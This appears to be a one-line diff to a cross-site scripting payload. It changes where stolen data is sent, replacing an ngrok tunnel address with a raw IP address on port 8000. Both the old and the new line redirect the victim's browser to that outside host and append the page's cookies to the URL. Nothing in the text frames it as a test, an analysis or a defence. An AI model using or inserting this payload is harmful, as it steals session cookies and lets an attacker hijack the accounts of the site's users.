@@ -1,1 +1,1 @@
-document.location="http://2.tcp.ngrok.io:18168/?c="+document.cookie;
+document.location="http://51.254.99.117:8000/?c="+document.cookie;
